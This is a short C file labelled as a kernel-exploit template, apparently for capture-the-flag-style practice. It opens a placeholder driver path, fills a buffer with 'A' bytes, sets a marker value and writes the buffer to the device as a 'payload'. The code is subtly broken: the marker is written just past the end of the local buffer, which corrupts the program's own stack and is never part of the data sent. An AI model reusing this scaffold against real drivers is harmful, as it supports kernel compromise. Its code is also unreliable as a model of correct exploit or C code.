#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>


// KernPwn template

char *VULN_DRV = "/---/process";

int main() {
    printf("open process /---/process\n");

    int fd = open("/---/process", O_RDWR);
    char buf[0x20];
    uint64_t *markers = (uint64_t *)(buf + 0x20);

    printf("sending payload\n");

    memset(buf, 'A', sizeof(buf));
                 
    markers[0] = 0x4444444444444444;
    write(fd, buf, sizeof(buf));
    close(fd);

    printf("payload sent\n");
    return 0;
}
